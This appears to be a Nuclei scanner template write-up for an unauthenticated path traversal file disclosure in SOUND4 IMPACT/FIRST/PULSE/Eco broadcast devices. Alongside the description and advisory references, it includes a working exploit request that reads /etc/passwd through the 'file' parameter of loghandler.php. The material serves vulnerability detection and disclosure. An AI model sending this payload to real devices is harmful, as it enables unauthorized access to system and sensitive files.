# Nuclei Template: SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (PHPTail) Unauthenticated File Disclosure
**Template ID:** sound4-file-disclosure
**Vulnerability Class:** Path Traversal
**Severity:** Medium
**Source:** Nuclei Template (`sound4-file-disclosure.yaml`)

## Vulnerability Information & PoC

## Description
The application suffers from an unauthenticated file disclosure vulnerability. Using the 'file' GET parameter attackers can disclose arbitrary files on the affected device and disclose sensitive and system information.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd
```

## References
- https://packetstormsecurity.com/files/170263/SOUND4-IMPACT-FIRST-PULSE-Eco-2.x-Unauthenticated-File-Disclosure.html
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5736.php
